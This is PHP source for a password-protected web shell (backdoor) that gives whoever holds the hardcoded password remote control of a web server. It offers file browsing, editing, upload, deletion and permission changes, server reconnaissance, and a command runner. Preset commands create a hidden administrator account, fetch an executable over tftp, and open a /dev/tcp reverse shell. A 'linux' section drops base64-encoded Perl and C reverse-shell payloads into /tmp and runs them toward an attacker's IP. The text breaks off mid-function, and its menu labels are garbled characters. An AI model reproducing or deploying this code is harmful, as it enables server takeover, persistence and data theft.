<?php
error_reporting(E_ERROR | E_PARSE);
@set_time_limit(0);
header("content-Type: text/html; charset=gb2312");
ob_start();
$password = a123;
define('myaddress', $_SERVER['SCRIPT_FILENAME']);
define('envlpass', $password);
define('shellname', $shellname);
define('myurl', $myurl);
if (@get_magic_quotes_gpc()) {
    foreach ($_POST as $k => $v) {
        $_POST[$k] = stripslashes($v);
    }
    foreach ($_GET as $k => $v) {
        $_GET[$k] = stripslashes($v);
    }
}
if (isset($_REQUEST[envlpass])) {
    hmlogin(2);
    exit;
}
if ($_COOKIE['envlpass'] != md5(envlpass)) {
    if ($_POST['envlpass']) {
        if ($_POST['envlpass'] == envlpass) {
            setcookie('envlpass', md5($_POST['envlpass']));
            css_main();
            hmlogin();
            
            die;
        } else {
            echo '<CENTER>???????,??5?????????</CENTER>';
        }
    }
    islogin($shellname, $myurl);
    exit;
}
/*---End Login---*/
if (isset($_GET['down'])) {
    do_down($_GET['down']);
}
if (isset($_GET['pack'])) {
    $dir = do_show($_GET['pack']);
    $zip = new eanver($dir);
    $out = $zip->out;
    do_download($out, "eanver.tar.gz");
}
if (isset($_GET['unzip'])) {
    css_main();
    start_unzip($_GET['unzip'], $_GET['unzip'], $_GET['todir']);
    exit;
}
define('root_dir', str_replace('\\', '/', dirname(myaddress)) . '/');
define('run_win', substr(PHP_OS, 0, 3) == "WIN");
define('my_shell', str_path(root_dir . $_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if ($img) {
    css_img($img);
}
if ($eanver == "phpinfo") {
    die(phpinfo());
}
if ($eanver == 'logout') {
    setcookie('envlpass', null);
    die('<meta http-equiv="refresh" content="0;URL=?">');
}
$class = array("???????" => array("upfiles" => "??????", "phpinfo" => "???????", "info_f" => "?????", "phpcode" => "???PHP???"), "???????" => array("sqlshell" => "???SQL???", "mysql_exec" => "Mysql????", "othersql" => "?????????", "myexp" => "Mysql_udf???", "winapi" => "Win Api???", "mofshell" => "Mof??????", "cmd" => "???Cmd????", "linux" => "???????", "servu" => "Serv-U???", "readpass" => "??????root????", "downloader" => "???????", "port" => "??????"), "????????" => array("guama" => "????????????", "tihuan" => "?????ùI????", "scanfile" => "???????????", "scanphp" => "???????????", "zippak" => "ZIP???"), "??????" => array("getcode" => "?????????"));
$msg = array("0" => "??????", "1" => "???????", "2" => "??????", "3" => "??????", "4" => "?????", "5" => "??????", "6" => "??????", "7" => "??????");
css_main();
switch ($eanver) {
    case "left":
        css_left();
        html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
        html_img("title");
        html_n(" ???????</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
        $ROOT_DIR = File_Mode();
        for ($i = 66; $i <= 90; $i++) {
            $drive = chr($i) . ':';
            if (is_dir($drive . "/")) {
                $vol = File_Str("vol {$drive}");
                if (empty($vol)) {
                    $vol = $drive;
                }
                html_n("<li><a title='{$drive}' href='?eanver=main&path={$drive}' target='main'>???????({$drive})</a></li>");
            }
        }
        html_n("<li><a title='{$ROOT_DIR}' href='?eanver=main&path={$ROOT_DIR}' target='main'>???????</a></li>");
        html_n("<li><a href='?eanver=main' target='main'>????????</a></li>");
        html_n("</ul></dd></dl>");
        $i = 2;
        foreach ($class as $name => $array) {
            html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items{$i}');\" target=\"_self\">");
            html_img("title");
            html_n(" {$name}</a></dt><dd id=\"items{$i}\" style=\"display:block;\"><ul>");
            foreach ($array as $url => $value) {
                html_n("<li><a href=\"?eanver={$url}\" target='main'>{$value}</a></li>");
            }
            html_n("</ul></dd></dl>");
            $i++;
        }
        html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items{$i}');\" target=\"_self\">");
        html_img("title");
        html_n(" ????????</a></dt><dd id=\"items{$i}\" style=\"display:block;\"><ul>");
        html_n("<li><a title='??????' href='?eanver=logout' target=\"main\">??????</a></li>");
        html_n("</ul></dd></dl>");
        html_n("</div>");
        break;
    case "main":
        css_js("1");
        function getFilePermissions($file)
        {
            $perms = fileperms($file);
            if (($perms & 0xc000) == 0xc000) {
                // Socket
                $info = 's';
            } elseif (($perms & 0xa000) == 0xa000) {
                // Symbolic Link
                $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
                // Regular
                $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
                // Block special
                $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
                // Directory
                $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
                // Character special
                $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
                // FIFO pipe
                $info = 'p';
            } else {
                // Unknown
                $info = 'u';
            }
            // Owner
            $info .= $perms & 0x100 ? 'r' : '-';
            $info .= $perms & 0x80 ? 'w' : '-';
            $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-');
            // Group
            $info .= $perms & 0x20 ? 'r' : '-';
            $info .= $perms & 0x10 ? 'w' : '-';
            $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-');
            // World
            $info .= $perms & 0x4 ? 'r' : '-';
            $info .= $perms & 0x2 ? 'w' : '-';
            $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-');
            return $info;
        }
        $dir = @dir($path);
        $REAL_DIR = File_Str(realpath($path));
        if (!empty($_POST['actall'])) {
            echo '<div class="actall">' . File_Act($_POST['files'], $_POST['actall'], $_POST['inver'], $REAL_DIR) . '</div>';
        }
        $NUM_D = $NUM_F = 0;
        if (!$_SERVER['SERVER_NAME']) {
            $GETURL = '';
        } else {
            $GETURL = 'http://' . $_SERVER['SERVER_NAME'] . '/';
        }
        $ROOT_DIR = File_Mode();
        html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>°§??:<input class='form-control' type='hidden' name='eanver' value='main'>");
        html_n("<input class='form-control' type='text' size='80' name='path' value='{$path}'> <input class='btn btn-primary' type='submit' value='???'></form>");
        html_n("<form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=" . urlencode($path) . "'>");
        html_n("<input class='btn btn-primary' type=\"button\" value=\"??????\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=" . urlencode($path) . "&refile=1&name=');\">&nbsp;<input class='btn btn-primary' type=\"button\" value=\"?????\" onclick=\"rusurechk('newdir','?eanver=editr&p=" . urlencode($path) . "&redir=1&name=');\">");
        html_input("file", "upfilet", "", "&nbsp;&nbsp;&nbsp;");
        html_input("submit", "uploadt", "???");
        if (!empty($_POST['newfile'])) {
            if (isset($_POST['bin'])) {
                $bin = $_POST['bin'];
            } else {
                $bin = "wb";
            }
            if (substr(PHP_VERSION, 0, 1) >= 5) {
                if ($_POST['charset'] == 'GB2312' or $_POST['charset'] == 'GBK') {
                } else {
                    $_POST['txt'] = iconv("gb2312//IGNORE", $_POST['charset'], $_POST['txt']);
                }
            }
            echo do_write($_POST['newfile'], $bin, $_POST['txt']) ? '<br>' . $_POST['newfile'] . ' ' . $msg[0] : '<br>' . $_POST['newfile'] . ' ' . $msg[1];
            @touch($_POST['newfile'], @strtotime($_POST['time']));
        }
        html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path=' . $path . '"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="35%"><b>');
        html_a('?eanver=main&path=' . uppath($path), '<b><font color=red>?????</font></b>');
        html_n('</b></td><td align="center" width="15%"><b>????</b></td><td align="center" width="10%">');
        html_n('<b>???????</b></td><td align="center" width="15%"><b>??????</b></td><td align="center" width="5%"><b>?????ß≥</b></td></tr>');
        while ($dirs = @$dir->read()) {
            if ($dirs == '.' or $dirs == '..') {
                continue;
            }
            $dirpath = str_path("{$path}/{$dirs}");
            if (is_dir($dirpath)) {
                $perm = getFilePermissions($dirpath) . " " . substr(base_convert(fileperms($dirpath), 10, 8), -4);
                $filetime = @date('Y-m-d H:i:s', @filemtime($dirpath));
                $dirpath = urlencode($dirpath);
                html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="' . $dirs . '">');
                html_img("dir");
                html_a('?eanver=main&path=' . $dirpath, $dirs);
                html_n('</td><td align="center">');
                html_n("<a href=\"#\" onClick=\"rusurechk('{$dirs}','?eanver=rename&p={$dirpath}&newname=');return false;\">????</a>");
                html_n("<a href=\"#\" onClick=\"rusuredel('{$dirs}','?eanver=deltree&p={$dirpath}');return false;\">???</a> ");
                html_a('?pack=' . $dirpath, '???');
                html_n('</td><td align="center">');
                html_a('?eanver=perm&p=' . $dirpath . '&chmod=' . $perm, $perm);
                html_n('</td><td align="center">' . $filetime . '</td><td align="right">');
                html_n('</td></tr>');
                $NUM_D++;
            }
        }
        @$dir->rewind();
        while ($files = @$dir->read()) {
            if ($files == '.' or $files == '..') {
                continue;
            }
            $filepath = str_path("{$path}/{$files}");
            if (!is_dir($filepath)) {
                $fsize = @filesize($filepath);
                $fsize = File_Size($fsize);
                $perm = getFilePermissions($dirpath) . " " . substr(base_convert(fileperms($filepath), 10, 8), -4);
                $filetime = @date('Y-m-d H:i:s', @filemtime($filepath));
                $Fileurls = str_replace(File_Str($ROOT_DIR . '/'), $GETURL, $filepath);
                $todir = $ROOT_DIR . '/zipfile';
                $filepath = urlencode($filepath);
                $it = substr($filepath, -3);
                html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="' . $files . '">');
                html_img(css_showimg($files));
                html_a($Fileurls, $files, ' target="_blank" title="??"');
                html_n('</td><td align="center">');
                if ($it == '.gz' or $it == 'zip' or $it == 'tar' or $it == '.7z') {
                    html_a('?unzip=' . $filepath, '???', 'title="???' . $files . '" onClick="rusurechk(\'' . $todir . '\',\'?unzip=' . $filepath . '&todir=\');return false;"');
                } else {
                    html_a('?eanver=editr&p=' . $filepath, '??', 'title="??' . $files . '"');
                }
                html_n("<a href=\"#\" onClick=\"rusurechk('{$files}','?eanver=rename&p={$filepath}&newname=');return false;\">????</a>");
                html_n("<a href=\"#\" onClick=\"rusurechk('" . urldecode($filepath) . "','?eanver=copy&p={$filepath}&newcopy=');return false;\">????</a>");
                html_n("<a href=\"#\" onClick=\"rusuredel('{$files}','?eanver=del&p={$filepath}');return false;\">???</a> ");
                html_a('?down=' . $filepath, '????', '??', 'title="????' . $files . '"');
                html_n('</td><td align="center">');
                html_a('?eanver=perm&p=' . $filepath . '&chmod=' . $perm, $perm);
                html_n('</td><td align="center">' . $filetime . '</td><td align="center">');
                html_a('?down=' . $filepath, $fsize, 'title="????' . $files . '"');
                html_n('</td></tr>');
                $NUM_F++;
            }
        }
        @$dir->close();
        if (!$Filetime) {
            $Filetime = gmdate('Y-m-d H:i:s', time() + 3600 * 8);
        }
        print <<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="????" onclick="SubmitUrl('????????????°§??: ','{$REAL_DIR}','a');return false;"> 
<input type="button" value="???" onclick="Delok('??????','b');return false;"> 
<input type="button" value="????" onclick="SubmitUrl('???????????????: ','0666','c');return false;"> 
<input type="button" value="???" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="???" onclick="SubmitUrl('??????????????????????: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
??({$NUM_D}) / ???({$NUM_F})</div> 
</form> 
END;
        break;
    case "editr":
        css_js("2");
        if (!empty($_POST['uploadt'])) {
            echo @copy($_FILES['upfilet']['tmp_name'], str_path($p . '/' . $_FILES['upfilet']['name'])) ? html_a("?eanver=main", $_FILES['upfilet']['name'] . ' ' . $msg[2]) : msg($msg[3]);
            die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . urlencode($p) . '">');
        }
        if (!empty($_GET['redir'])) {
            $name = $_GET['name'];
            $newdir = str_path($p . '/' . $name);
            @mkdir($newdir, 0777) ? html_a("?eanver=main", $name . ' ' . $msg[0]) : msg($msg[1]);
            die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . urlencode($p) . '">');
        }
        if (!empty($_GET['refile'])) {
            $name = $_GET['name'];
            $jspath = urlencode($p . '/' . $name);
            $pp = urlencode($p);
            $p = str_path($p . '/' . $name);
            $FILE_CODE = "";
            $charset = 'GB2312';
            $FILE_TIME = date('Y-m-d H:i:s', time() + 3600 * 8);
            if (@file_exists($p)) {
                echo '??????????"???"???<br>';
            }
        } else {
            $jspath = urlencode($p);
            $FILE_TIME = date('Y-m-d H:i:s', filemtime($p));
            $FILE_CODE = @file_get_contents($p);
            if (substr(PHP_VERSION, 0, 1) >= 5) {
                if (empty($_GET['charset'])) {
                    if (TestUtf8($FILE_CODE) > 1) {
                        $charset = 'UTF-8';
                        $FILE_CODE = iconv("UTF-8", "gb2312//IGNORE", $FILE_CODE);
                    } else {
                        $charset = 'GB2312';
                    }
                } else {
                    if ($_GET['charset'] == 'GB2312') {
                        $charset = 'GB2312';
                    } else {
                        $charset = $_GET['charset'];
                        $FILE_CODE = iconv($_GET['charset'], "gb2312//IGNORE", $FILE_CODE);
                    }
                }
            }
            $FILE_CODE = htmlspecialchars($FILE_CODE);
        }
        print <<<END
<div class="actall">????????: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="????" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">???????<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="???" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;"> 
END;
        html_select(array("GB2312" => "GB2312", "UTF-8" => "UTF-8", "BIG5" => "BIG5", "EUC-KR" => "EUC-KR", "EUC-JP" => "EUC-JP", "SHIFT-JIS" => "SHIFT-JIS", "WINDOWS-874" => "WINDOWS-874", "ISO-8859-1" => "ISO-8859-1"), $charset, "onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
        print <<<END
</div>
<div class="actall"><textarea name="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">????????? <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>?????????????????(???????)</div>
<div class="actall"><input type="button" value="????" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='????'> 
<input type="button" value="????" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
        break;
    case "rename":
        html_n("<tr><td>");
        $newname = urldecode($pp) . '/' . urlencode($_GET['newname']);
        @rename($p, $newname) ? html_a("?eanver=main&path={$pp}", urlencode($_GET['newname']) . ' ' . $msg[4]) : msg($msg[5]);
        die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . $pp . '">');
        break;
    case "deltree":
        html_n("<tr><td>");
        do_deltree($p) ? html_a("?eanver=main&path={$pp}", $p . ' ' . $msg[6]) : msg($msg[7]);
        die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . $pp . '">');
        break;
    case "del":
        html_n("<tr><td>");
        @unlink($p) ? html_a("?eanver=main&path={$pp}", $p . ' ' . $msg[6]) : msg($msg[7]);
        die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . $pp . '">');
        break;
    case "copy":
        html_n("<tr><td>");
        $newpath = explode('/', $_GET['newcopy']);
        $pathr[0] = $newpath[0];
        for ($i = 1; $i < count($newpath); $i++) {
            $pathr[] = urlencode($newpath[$i]);
        }
        $newcopy = implode('/', $pathr);
        @copy($p, $newcopy) ? html_a("?eanver=main&path={$pp}", $newcopy . ' ' . $msg[4]) : msg($msg[5]);
        die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . $pp . '">');
        break;
    case "perm":
        html_n("<form method='POST'><tr><td>" . $p . ' ?????: ');
        if (is_dir($p)) {
            html_select(array("0777" => "0777", "0755" => "0755", "0555" => "0555"), $_GET['chmod']);
        } else {
            html_select(array("0666" => "0666", "0644" => "0644", "0444" => "0444"), $_GET['chmod']);
        }
        html_input("submit", "save", "???");
        back();
        if ($_POST['class']) {
            switch ($_POST['class']) {
                case "0777":
                    $change = @chmod($p, 0777);
                    break;
                case "0755":
                    $change = @chmod($p, 0755);
                    break;
                case "0555":
                    $change = @chmod($p, 0555);
                    break;
                case "0666":
                    $change = @chmod($p, 0666);
                    break;
                case "0644":
                    $change = @chmod($p, 0644);
                    break;
                case "0444":
                    $change = @chmod($p, 0444);
                    break;
            }
            $change ? html_a("?eanver=main&path={$pp}", $msg[4]) : msg($msg[5]);
            die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path=' . $pp . '">');
        }
        html_n("</td></tr></form>");
        break;
    case "info_f":
        function Info_Cfg($varname)
        {
            switch ($result = get_cfg_var($varname)) {
                case 0:
                    return "No";
                    break;
                case 1:
                    return "Yes";
                    break;
                default:
                    return $result;
                    break;
            }
        }
        function Info_Fun($funName)
        {
            return false !== function_exists($funName) ? "Yes" : "No";
        }
        $dis_func = get_cfg_var("disable_functions");
        $upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "?????????";
        $adminmail = isset($_SERVER['SERVER_ADMIN']) ? "<a href=\"mailto:" . $_SERVER['SERVER_ADMIN'] . "\">" . $_SERVER['SERVER_ADMIN'] . "</a>" : "<a href=\"mailto:" . get_cfg_var("sendmail_from") . "\">" . get_cfg_var("sendmail_from") . "</a>";
        if ($dis_func == "") {
            $dis_func = "No";
        } else {
            $dis_func = str_replace(" ", "<br>", $dis_func);
            $dis_func = str_replace(",", "<br>", $dis_func);
        }
        $phpinfo = !eregi("phpinfo", $dis_func) ? "Yes" : "No";
        $info = array(array("?????????/???????", date("Y??m??d?? h:i:s", time()) . "&nbsp;/&nbsp;" . gmdate("Y??n??j?? H:i:s", time() + 8 * 3600)), array("??????????:???(ip)", "<a href=\"http://" . $_SERVER['SERVER_NAME'] . "\" \r\ntarget=\"_blank\">" . $_SERVER['SERVER_NAME'] . "</a>:" . $_SERVER['SERVER_PORT'] . " ( " . gethostbyname($_SERVER['SERVER_NAME']) . " )"), array("????????????(?????\r\n??)", PHP_OS . " (" . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . ")"), array("??????????????", $_SERVER['SERVER_SOFTWARE']), array("???IP", getenv('REMOTE_ADDR')), array("PHP???ßŸ??(\r\n?∑⁄)", strtoupper(php_sapi_name()) . "(" . PHP_VERSION . ") / ?????:" . Info_Cfg("safemode")), array("???????????", $adminmail), array("?????°§??", __FILE__), array("???????URL?????[allow_url_fopen]", Info_Cfg("allow_url_fopen")), array("????????????????[enable_dl]", Info_Cfg("enable_dl")), array("??????????[display_errors]", Info_Cfg("display_errors")), array("???????????[register_globals]", Info_Cfg("register_globals")), array("???????????[magic_quotes_gpc]", Info_Cfg("magic_quotes_gpc")), array("???????????[memory_limit]", Info_Cfg("memory_limit")), array("POST??????[post_max_size]", Info_Cfg("post_max_size")), array("??????????[upload_max_filesize]", $upsize), array("?????????????[max_execution_time]", Info_Cfg("max_execution_time") . "??"), array("???®≤???[disable_functions]", $dis_func), array("???????????[phpinfo()]", $phpinfo), array("?????ß·?????diskfreespace", intval(diskfreespace(".") / (1024 * 1024)) . 'Mb'), array("GZ?????????[zlib]", Info_Fun("gzclose")), array("ZIP?????????[ZipArchive(php_zip)]", Info_Fun("zip_open")), array("IMAP?????????", Info_Fun("imap_close")), array("XML????", Info_Fun("xml_set_object")), array("FTP???", Info_Fun("ftp_login")), array("Session???", Info_Fun("session_start")), array("Socket???", Info_Fun("fsockopen")), array("MySQL?????", Info_Fun("mysql_close")), array("MSSQL?????", Info_Fun("mssql_close")), array("Postgre SQL?????", Info_Fun("pg_close")), array("SQLite?????", Info_Fun("sqlite_close")), array("Oracle?????", Info_Fun("ora_close")), array("Oracle 8?????", Info_Fun("OCILogOff")), array("SyBase?????", Info_Fun("sybase_close")), array("Hyperwave?????", Info_Fun("hw_close")), array("InforMix?????", Info_Fun("ifx_close")), array("FilePro?????", Info_Fun("filepro_fieldcount")), array("DBA/DBM????", Info_Fun("dba_close") . "&nbsp;/&nbsp;" . Info_Fun("dbmclose")), array("ODBC/dBASE????", Info_Fun("odbc_close") . "&nbsp;/&nbsp;" . Info_Fun("dbase_close")), array("PREL??????[PCRE]", Info_Fun("preg_match")), array("PDF???", Info_Fun("pdf_close")), array("??¶ƒ???[GD Library]", Info_Fun("imageline")), array("SNMP???????ßø??", Info_Fun("snmpget")));
        echo '<table width="100%" border="0">';
        for ($i = 0; $i < count($info); $i++) {
            echo '<tr><td width="40%">' . $info[$i][0] . '</td><td>' . $info[$i][1] . '</td></tr>' . "\n";
        }
        $shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
        try {
            $registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber");
            $Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
            $PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
        } catch (Exception $e) {
        }
        echo '<tr><td width="40%">Terminal Service????</td><td>' . $registry_proxystring . '</td></tr>' . "\n";
        echo '<tr><td width="40%">Telnet????</td><td>' . $Telnet . '</td></tr>' . "\n";
        echo '<tr><td width="40%">PcAnywhere????</td><td>' . $PcAnywhere . '</td></tr>' . "\n";
        echo '</table>';
        break;
    case "cmd":
        $res = '???????';
        $cmd = 'dir';
        if (!empty($_POST['cmd'])) {
            $res = Exec_Run(base64_decode($_POST['cmd']));
            $cmd = htmlspecialchars(base64_decode($_POST['cmd']));
        }
        print <<<END
<script language="javascript">
function sFull(i){
\tStr = new Array(11);
\tStr[0] = "dir";
\tStr[1] = "net user KillWaf 1P@ssWord /add";
\tStr[2] = "net localgroup administrators KillWaf /add";
\tStr[3] = "netstat -ano";
\tStr[4] = "ipconfig";
\tStr[5] = "copy c:\\1.php d:\\2.php";
\tStr[6] = "tftp -i {$_SERVER["REMOTE_ADDR"]} get server.exe c:\\server.exe";
\tStr[7] = "0<&123;exec 123<>/dev/tcp/{$_SERVER["REMOTE_ADDR"]}/12666; sh <&123 >&123 2>&123";
\tStr[8] = "tasklist -svc";
\tdocument.getElementById('cmd').value = Str[i];
\treturn true;
}
END;
        html_base();
        print <<<END
function SubmitUrl(){
\t\t\tdocument.getElementById('cmd').value = base64encode(document.getElementById('cmd').value);
\t\t\tdocument.getElementById('gform').submit();
}
</script>
<form method="POST" name="gform" id="gform" ><center><div class="actall">????????????????????????????ß”?????????????????????????¶ ¶…??????????????????BASE64?????????????????ß≥?????????</div><div class="actall">
??????? <input type="text" name="cmd" id="cmd" value="{$cmd}" onkeydown="if(event.keyCode==13)SubmitUrl();" style="width:399px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>--??????--</option>
<option value="1">????????</option>
<option value="2">?????????</option>
<option value="3">?????</option>
<option value="4">?????</option>
<option value="5">???????</option>
<option value="6">FTP????</option>
<option value="7">Linux????</option>
<option value="8">??????</option>
</select>
\t<input type="button" value="???" onclick="SubmitUrl();" style="width:80px;">
</div>
<div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center>
</form>
END;
        break;
    case "linux":
        $yourip = isset($_POST['yourip']) ? $_POST['yourip'] : getenv('REMOTE_ADDR');
        $yourport = isset($_POST['yourport']) ? $_POST['yourport'] : '12666';
        $system = strtoupper(substr(PHP_OS, 0, 3));
        print <<<END
<div class="actall">??°¬?????<br>
\t\t\t???????????????"nc -vv -l 12666"<br>
\t\t\t????????ß’??????IP,?????????????????????????NC??????</div>
<form method="POST" name="kform" id="kform">
<div class="actall">????? <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
<div class="actall">?????? <input type="text" name="yourport" value="12666" style="width:400px"></div>
<div class="actall">??ßŸ?? <select name="use" >
<option value="perl">Perl</option>
<option value="c">C</option>
<option value="php">PHP</option>
<option value="nc">NC</option>
</select></div>
<div class="actall"><input type="submit" value="???????" style="width:80px;"></div></form>
END;
        if (!empty($_POST['yourip']) && !empty($_POST['yourport'])) {
            echo '<div class="actall">';
            if ($_POST['use'] == 'perl') {
                $back_connect_pl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj" . "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" . "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT" . "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" . "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi" . "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl" . "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
                echo File_Write('/tmp/envl_bc', base64_decode($back_connect_pl), 'wb') ? '????/tmp/envl_bc???<br>' : '????/tmp/envl_bc???<br>';
                $perlpath = Exec_Run('which perl');
                $perlpath = $perlpath ? chop($perlpath) : 'perl';
                @unlink('/tmp/envl_bc.c');
                echo Exec_Run($perlpath . ' /tmp/envl_bc ' . $_POST['yourip'] . ' ' . $_POST['yourport'] . ' &') ? 'nc -vv -l ' . $_POST['yourport'] : '??????????';
            }
            if ($_POST['use'] == 'c') {
                $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" . "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" . "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" . "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" . "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC" . "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D" . "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" . "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
                echo File_Write('/tmp/envl_bc.c', base64_decode($back_connect_c), 'wb') ? '????/tmp/envl_bc.c???<br>' : '????/tmp/envl_bc.c???<br>';
                $res = Exec_Run('gcc -o /tmp/envl_bc /tmp/envl_bc.c');
                @unlink('/tmp/envl_bc.c');
                echo Exec_Run('/tmp/envl_bc ' . $_POST['yourip'] . ' ' . $_POST['yourport'] . ' &') ? 'nc -vv -l ' . $_POST['yourport'] : '??????????';
            }
            if ($_POST['use'] == 'php') {
                if (!extension_loaded('sockets')) {
                    if ($system == 'WIN') {
                        @dl('php_sockets.dll') or die("Can't load socket");
                    } else {
                        @dl('sockets.so') or die("Can't load socket");
                    }
                }
                if ($system == "WIN") {
                    $env = array('path' => 'c:\\windows\\system32');
                } else {
                    $env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
                }
                $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $host = $_POST['yourip'];
                $port = $_POST['yourport'];
                $host = gethostbyname($host);
                $proto = getprotobyname("tcp");
